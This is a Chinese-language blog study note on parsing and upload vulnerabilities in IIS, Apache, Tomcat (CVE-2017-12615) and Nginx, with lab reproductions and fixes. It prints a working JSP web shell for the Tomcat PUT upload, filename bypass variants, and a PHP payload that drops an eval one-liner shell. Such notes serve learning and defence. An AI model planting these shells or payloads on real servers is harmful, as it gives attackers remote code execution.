{"title":"中间件漏洞","uid":"9ca6f9d849950348e5ffe49b9724c767","slug":"中间件漏洞","date":"2023-01-10T13:21:22.723Z","updated":"2022-11-30T16:57:58.862Z","comments":true,"path":"api/articles/中间件漏洞.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora1289175.jpg","content":"<h2 id=\"IIS\"><a href=\"#IIS\" class=\"headerlink\" title=\"IIS\"></a>IIS</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>IIS（Internet Information Services），互联网信息服务，由微软公司提供的可扩展web服务器，支 持HTTP、HTTP&#x2F;2、HTTPS等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP和后 续版本一起发布，IIS目前只支持Windows系统，不适用于其他操作系统</p>\n<h3 id=\"IIS6-0解析漏洞\"><a href=\"#IIS6-0解析漏洞\" class=\"headerlink\" title=\"IIS6.0解析漏洞\"></a>IIS6.0解析漏洞</h3><h4 id=\"第一种-文件解析\"><a href=\"#第一种-文件解析\" class=\"headerlink\" title=\"第一种:文件解析\"></a>第一种:文件解析</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">IIS6.0&#x3D;&#x3D;&gt;1.asp;.jpg&#x3D;&#x3D;&gt;00截断的变形\n检测时会以最后一个.去判断，为jpg\n中间件解析时会以.asp解析\n\n原理：服务器默认不解析;号后面的内容，因此1.asp;.jpg便被解析成asp文件了\n\n修复方案：用正则写自定义WAF，阻止1.asp;.jpg类型的文件名</code></pre>\n\n\n\n<h4 id=\"第二种-目录解析\"><a href=\"#第二种-目录解析\" class=\"headerlink\" title=\"第二种:目录解析\"></a>第二种:目录解析</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">a.asp&#x2F;123.jpg&#x3D;&#x3D;&gt;会不会是个目录？\n当中间件IIS6.0遇到a.asp&#x2F; 时 会把a.asp&#x2F; 下的所有内容当作asp文件执行\n\n原理：服务器默认会把.asp，.asa目录下的文件都解析成asp文件\nasp站点 IIS6.0：一般来说aspx的站点会兼容asp\nIIS6.0默认的可执行文件除了asp还包含asa、cer、cdx\n\n修复方案：用正则写自定义WAF，阻止a.asp&#x2F;123.jpg该类型的链接</code></pre>\n\n\n\n<h3 id=\"IIS7-0-x2F-IIS7-5-解析漏洞\"><a href=\"#IIS7-0-x2F-IIS7-5-解析漏洞\" class=\"headerlink\" title=\"IIS7.0&#x2F;IIS7.5 解析漏洞\"></a>IIS7.0&#x2F;IIS7.5 解析漏洞</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"http://www.xx.com/phpinfo.jpg/1.php\">www.xx.com/phpinfo.jpg/1.php</a></p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">当中间件访问1.php 会认为它是一个PHP文件，当1.php不存在时，会自动跳转至上一级phpinfo.jpg，\n会把phpinfo.jpg误当作php文件去执行\n\n意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“&#x2F;xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。\n\n1.jpg&#x2F;1.php\n\n修复方案：用正则写自定义WAF，阻止phpinfo.jpg&#x2F;1.php该类型的链接</code></pre>\n\n\n\n\n\n<h2 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache\"></a>Apache</h2><h3 id=\"简介-1\"><a href=\"#简介-1\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多 数计算机操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它 快速、可靠并且可通过简单的API扩展，将Perl&#x2F;Python等解释器编译到服务器中。</p>\n<h3 id=\"配置文件漏洞\"><a href=\"#配置文件漏洞\" class=\"headerlink\" title=\"配置文件漏洞\"></a>配置文件漏洞</h3><p>Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件名，解析就再往左判断。 </p>\n<p>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别文件名解析，apache就会把 oldboy.php.owf.rar解析成oldboy.php。</p>\n<p>漏洞形式:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"http://www.xxxx.xxx.com/test.php.php123\">www.xxxx.xxx.com/test.php.php123</a></p></blockquote>\n<h4 id=\"配置文件修改\"><a href=\"#配置文件修改\" class=\"headerlink\" title=\"配置文件修改\"></a>配置文件修改</h4><p>1、如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。 </p>\n<p>2、如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>\n<h4 id=\"修复方案\"><a href=\"#修复方案\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h4><p>apache配置文件，禁止.php.这样的文件执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在配置文件中加入\n&lt;Files ~ “.(php.|php3.)”&gt;\n\tOrder Allow,Deny\n\tDeny from all\n&lt;&#x2F;Files&gt;</code></pre>\n\n\n\n<h2 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a>Tomcat</h2><h3 id=\"常见高危漏洞\"><a href=\"#常见高危漏洞\" class=\"headerlink\" title=\"常见高危漏洞\"></a>常见高危漏洞</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">Tomcat后台弱口令上传war包\nTomcat的PUT的上传漏洞(CVE-2017-12615)\nTomcat反序列化漏洞(CVE-2016-8735)\nTomcat之JMX服务弱口令漏洞\nTomcat 样例目录session操控漏洞\nTomcat本地提权漏洞(CVE-2016-1240)\nTomcat win版默认空口令漏洞(CVE-2009-3548)</code></pre>\n\n\n\n<h3 id=\"简介-2\"><a href=\"#简介-2\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>TomcatTomcat是一个实现了JAVA EE标准的最小的WEB服务器，是Apache 软件基金会的Jakarta 项目 中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性 能稳定，而且开源免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流 行的Web 应用服务器。 </p>\n<p>在B&#x2F;S架构中，浏览器发出的http请求经过Tomcat中间件，转发到最终的目的服务器上，响应消息再通 过Tomcat返回给浏览器。</p>\n<h3 id=\"远程代码执行漏洞-PUT请求上传漏洞\"><a href=\"#远程代码执行漏洞-PUT请求上传漏洞\" class=\"headerlink\" title=\"远程代码执行漏洞(PUT请求上传漏洞)\"></a>远程代码执行漏洞(PUT请求上传漏洞)</h3><p><strong>漏洞编号:CVE-2017-12615</strong></p>\n<h4 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h4><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者通过构造的攻击请求向服 务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重</p>\n<h4 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h4><p><code>利用条件：Windows+Tomcat 7.0.x+配置文件readonly=false</code></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">&lt;init-param&gt;\n&lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;\n&lt;param-value&gt;false&lt;&#x2F;param-value&gt;\n&lt;&#x2F;init-param&gt;</code></pre>\n\n<p>Tomcat 的 Servlet 是在 conf&#x2F;web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候， 是通过 JspServlet 处理请求的：而其他的静态文件是通过 DefaultServlet 处理的：可以得知，“1.jsp空 格”（末尾有一个和空格）并不能匹配到 JspServlet，而是会交由 DefaultServlet 去处理。 </p>\n<p>当处理 PUT 请求时：会调用 resources.bind：dirContext 为 FileDirContext：调用 rebind 创建文 件：又由于 Windows 不允许“ ”作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。</p>\n<h4 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h4><p><strong>Apache Tomcat 7.0.0 - 7.0.81</strong></p>\n<p><strong>需要开启PUT请求方法</strong></p>\n<h4 id=\"修复方案-1\"><a href=\"#修复方案-1\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h4><p>readonly参数为true</p>\n<p>升级版本</p>\n<h4 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h4><p>1.通过vulhub拉取环境</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124201713706.png\" alt=\"image-20221124201713706\"></p>\n<p>2.通过burp抓取访问目录根目录的请求包，并发送到repeater模块</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124201936947.png\" alt=\"image-20221124201936947\"></p>\n<p>3.将GET请求方式修改为OPTIONOS</p>\n<p><strong>tips：OPTIONS请求方式请求服务器返回所支持的所有HTTP请求方法</strong></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124202106953.png\" alt=\"image-20221124202106953\"></p>\n<p>不允许此请求，再次修改</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124202835205.png\" alt=\"image-20221124202835205\"></p>\n<p>4.OPTIONOS请求改为PUT，修改名字,并在下面添加jsp的shell</p>\n<p>shell: </p>\n<p>密码为passwd</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">&lt;%!\n    class U extends ClassLoader &#123;\n        U(ClassLoader c) &#123;\n            super(c);\n        &#125;\n        public Class g(byte[] b) &#123;\n            return super.defineClass(b, 0, b.length);\n        &#125;\n    &#125;\n \n    public byte[] base64Decode(String str) throws Exception &#123;\n        try &#123;\n            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);\n            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);\n        &#125; catch (Exception e) &#123;\n            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);\n            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);\n            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);\n        &#125;\n    &#125;\n%&gt;\n&lt;%\n    String cls &#x3D; request.getParameter(&quot;passwd&quot;);\n    if (cls !&#x3D; null) &#123;\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    &#125;\n%&gt;</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124211938212.png\" alt=\"image-20221124211938212\"></p>\n<p>上传成功</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124212331093.png\" alt=\"image-20221124212331093\"></p>\n<p>5.蚁剑连接测试代码</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124212250677.png\" alt=\"image-20221124212250677\"></p>\n<p><strong>注意：绕过 JspServlet 方式</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">shell.jsp%20\nshell.jsp::$DATA\nshell.jsp&#x2F;</code></pre>\n\n\n\n<h2 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h2><h3 id=\"简介-3\"><a href=\"#简介-3\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务。 Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，在BSD-like 协议下发行。 </p>\n<p>其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好。</p>\n<h3 id=\"文件解析漏洞\"><a href=\"#文件解析漏洞\" class=\"headerlink\" title=\"文件解析漏洞\"></a>文件解析漏洞</h3><h4 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h4><p>该漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞。由于nginx.conf的如下配置导致 nginx把以’.php’结尾的文件交给fastcgi处理,对于任意文件名，在后面添加&#x2F;xxx.php（xxx）为任意字符 后，即可将文件作为php解析。</p>\n<h4 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h4><p>Nginx默认是以CGI的方式支持PHP解析，普遍的做法是在Nginx配置文件中通过正则匹配设置 SCRIPT_FILENAME。</p>\n<p>当访问<a href=\"http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA\">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为</a> “phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参 数，并将phpinfo.jpg作为PHP文件解析呢？ </p>\n<p>这就要说到fix_pathinfo选项， 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为 SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解 析了。</p>\n<h4 id=\"漏洞形式\"><a href=\"#漏洞形式\" class=\"headerlink\" title=\"漏洞形式\"></a>漏洞形式</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php\nwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg%00.php [xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)]\nwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20.php</code></pre>\n\n<p>另一种攻击手法： </p>\n<p>上传一个名字为test.jpg，以下为文件内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre>\n\n<p>然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</p>\n<h4 id=\"漏洞复现-1\"><a href=\"#漏洞复现-1\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h4><p>1.切换php版本</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124214115380.png\" alt=\"image-20221124214115380\"></p>\n<p>2.打开配置文件</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124214222714.png\" alt=\"image-20221124214222714\"></p>\n<p>3.在网站根目录下创建111.jpg</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124214333479.png\" alt=\"image-20221124214333479\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124214356935.png\" alt=\"image-20221124214356935\"></p>\n<p>4.访问111.jpg</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124214452955.png\" alt=\"image-20221124214452955\"></p>\n<p>5.在111.jpg后加&#x2F;xxx.php,我们111.jpg中的函数就会被执行</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221124214604336.png\" alt=\"image-20221124214604336\"></p>\n<p>当访问&#x2F;111.jpg&#x2F;xxx.php时，nginx将查看url，看到它以.php结尾，将路径传给PHP  fastcgi进行处理。但是fastcgi在处理’xxx.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo&#x3D;1 发挥作用,这项配置默认开启，值为1，用于修复路径,如果当前路径不存在则采用上层路径。</p>\n<p>为此这里交由fastcgi处理的文件就变成了’&#x2F;1.jpg’。新版本的php的配置文件php-fpm.conf引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件。</p>\n<h4 id=\"CGI\"><a href=\"#CGI\" class=\"headerlink\" title=\"CGI\"></a>CGI</h4><p>公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编 写的程序可以扩展服务器功能。 CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库 服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库 中。 </p>\n<p>几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI 分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏 览器通信采用标准输入输出方式。 间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入 输出进行通信 。</p>\n<h4 id=\"修复方案-2\"><a href=\"#修复方案-2\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h4><p>1.将php.ini文件中的cgi.fix_pathinfo的值设置为0</p>\n<p>2.php-fpm.conf中的security.limit_extensions后面的值设置为.php</p>\n","text":"IIS简介IIS（Internet Information Services），互联网信息服务，由微软公司提供的可扩展web服务器，支 持HTTP、HTTP&#x2F;2、HTTPS等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP和后...","link":"","photos":[],"count_time":{"symbolsCount":"6.2k","symbolsTime":"6 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":13,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞","slug":"漏洞","count":3,"path":"api/tags/漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IIS\"><span class=\"toc-text\">IIS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#IIS6-0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">IIS6.0解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E7%A7%8D-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">第一种:文件解析</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E7%A7%8D-%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">第二种:目录解析</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#IIS7-0-x2F-IIS7-5-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">IIS7.0&#x2F;IIS7.5 解析漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Apache\"><span class=\"toc-text\">Apache</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-1\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">配置文件漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9\"><span class=\"toc-text\">配置文件修改</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88\"><span class=\"toc-text\">修复方案</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Tomcat\"><span class=\"toc-text\">Tomcat</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">常见高危漏洞</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-2\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-PUT%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">远程代码执行漏洞(PUT请求上传漏洞)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">漏洞描述</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC\"><span class=\"toc-text\">影响版本</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-1\"><span class=\"toc-text\">修复方案</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">漏洞复现</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Nginx\"><span class=\"toc-text\">Nginx</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B-3\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1\"><span class=\"toc-text\">漏洞描述</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%BD%A2%E5%BC%8F\"><span class=\"toc-text\">漏洞形式</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1\"><span class=\"toc-text\">漏洞复现</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CGI\"><span class=\"toc-text\">CGI</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-2\"><span class=\"toc-text\">修复方案</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"漏洞扫描工具安装及配置","uid":"3969cae396587846c4e6dba7e64fd9e1","slug":"漏洞扫描工具安装","date":"2023-01-10T13:21:22.739Z","updated":"2022-11-25T07:52:03.974Z","comments":true,"path":"api/articles/漏洞扫描工具安装.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-5gdp69_3840x2160.png","text":" 工具下载地址 链接：https://pan.baidu.com/s/1Ysn-u1ae6Z-p4PD2lDTKrg?pwd=x3ji提取码：x3ji AWVS先将压缩包解压 点击进行安装 一直下一步就行了，让你输邮箱就随便输一个，但是要记住 记住端口号 安装 